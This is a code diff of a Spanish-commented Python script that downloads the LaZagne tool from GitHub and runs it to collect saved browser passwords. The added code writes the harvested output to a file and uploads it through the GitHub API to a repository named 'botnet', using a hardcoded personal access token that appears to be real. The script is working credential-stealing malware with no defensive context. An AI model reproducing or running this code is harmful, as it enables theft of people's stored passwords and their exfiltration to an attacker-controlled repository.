@@ -25,6 +25,22 @@ def downloadFile(urlb, token, path):
     else:
         print('[-] ' + res.get('message', 'Error desconocido'))
 
+def uploadToGithub(filename, content, token):
+    print('[!] Subiendo ' + filename + ' a GitHub')
+    data = {
+        "message": "Add " + filename,
+        "content": base64.b64encode(content.encode('utf-8')).decode('utf-8')
+    }
+    url = "https://api.github.com/repos/Pol-Ruiz/botnet/contents/" + filename
+    headers = {
+        'Authorization': 'Bearer ' + token
+    }
+    res = requests.put(url, headers=headers, json=data)
+    if res.status_code == 201:
+        print('[!] ' + filename + ' ha sido subido a GitHub exitosamente.')
+    else:
+        print('[-] Hubo un error al subir ' + filename + ' a GitHub.')
+
 def run(token):
     urlb = "https://api.github.com/repos/AlessandroZ/LaZagne/contents/Linux/"
     path = 'Linux'
@@ -34,11 +50,26 @@ def run(token):
         os.makedirs(path, exist_ok=True)
         # Descargar el directorio
         downloadFile(urlb, token, path)
-        # Ejecutar el archivo con el argumento "all"
-        print('[!] Ejecutando laZagne.py')
-        subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "browsers"], check=True)
-    else:
-        print('[!] La carpeta Linux ya existe, no se descargará nada.')
-        subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "browsers"], check=True)
+    
+    # Ejecutar el archivo con el argumento "all"
+    print('[!] Ejecutando laZagne.py')
+    result = subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "browsers"], capture_output=True, text=True)
+    
+    # Guardar la salida en un archivo
+    output_filename = 'output.txt'
+    with open(output_filename, 'w') as f:
+        f.write(result.stdout)
+
+    # Subir el archivo a GitHub
+    uploadToGithub(output_filename, result.stdout, token)
+
+# Token desde el primer código
+token = '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'
+
+run(token)
+
+
+
+
 
 
